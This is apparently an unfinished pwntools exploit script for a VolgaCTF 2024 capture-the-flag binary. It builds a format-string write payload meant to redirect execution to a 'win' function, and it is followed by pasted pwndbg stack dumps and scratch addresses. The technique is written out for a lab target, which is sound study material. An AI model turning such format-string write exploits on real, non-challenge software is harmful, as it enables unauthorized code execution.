from pwn import *

exe = ELF('./warm_of_pon')
context.binary = exe.path

io = process(exe.path)
if args.GDB:
    io = gdb.debug(exe.path, """
        b *main
        b *main+31
        b *main+114
        b *main+217
        continue
    """)
elif args.REMOTE:
    io = remote('172.105.246.203', 1339)

win = 0x00000000004011c7


# 0xa7b000

"""
0x165e000 <- libc_start_main
0x165f000 <- win
...
0x167e000
"""


# writes = {0xa6a000: win}
# writes = {0x404000: win}
writes = {0xdead: 0x404100}
offset = 8
payload = fmtstr_payload(offset, writes, write_size='short')

print(payload)

payload = b'A'

io.sendline(payload)
io.interactive()

# printf(buf, a1, a2, ..., a12);



"""
pwndbg> stack 20                                                                                                                                                                                                                                                                           24
00:0000│ rsp 0x7fff0d002670 ◂— 0x0
01:0008│-028 0x7fff0d002678 ◂— 0x0
02:0010│ rdi 0x7fff0d002680 ◂— 0x61616e6c6c243925 ('%9$llnaa')
03:0018│-018 0x7fff0d002688 ◂— 0xdead
04:0020│-010 0x7fff0d002690 ◂— 0x0
05:0028│-008 0x7fff0d002698 ◂— 0x0
06:0030│ rbp 0x7fff0d0026a0 ◂— 0x1
07:0038│+008 0x7fff0d0026a8 —▸ 0x7f6f0c57cd90 (__libc_start_call_main+128) ◂— mov edi, eax
08:0040│+010 0x7fff0d0026b0 ◂— 0x0
09:0048│+018 0x7fff0d0026b8 —▸ 0x4011dd (main) ◂— push rbp
0a:0050│+020 0x7fff0d0026c0 ◂— 0x100000000
0b:0058│+028 0x7fff0d0026c8 —▸ 0x7fff0d0027b8 —▸ 0x7fff0d00432f ◂— '/workspaces/ctf-problems/2024/VolgaCTF/pwnable/warm_of_pon/warm_of_pon'
0c:0060│+030 0x7fff0d0026d0 ◂— 0x0
0d:0068│+038 0x7fff0d0026d8 ◂— 0x6d1f0ff46f1aaf33
0e:0070│+040 0x7fff0d0026e0 —▸ 0x7fff0d0027b8 —▸ 0x7fff0d00432f ◂— '/workspaces/ctf-problems/2024/VolgaCTF/pwnable/warm_of_pon/warm_of_pon'
0f:0078│+048 0x7fff0d0026e8 —▸ 0x4011dd (main) ◂— push rbp
10:0080│+050 0x7fff0d0026f0 —▸ 0x403df0 —▸ 0x401130 ◂— endbr64 
11:0088│+058 0x7fff0d0026f8 —▸ 0x7f6f0c7bf040 (_rtld_global) —▸ 0x7f6f0c7c02e0 ◂— 0x0
12:0090│+060 0x7fff0d002700 ◂— 0x92e115f42278af33
13:0098│+068 0x7fff0d002708 ◂— 0x93c1175bf590af33

0x7ffd766f4598
"""


"""
0x7ffff901f000 | 0x7ffff903c9f8
0x7ffe34af5000 | 0x7ffe34b13608
"""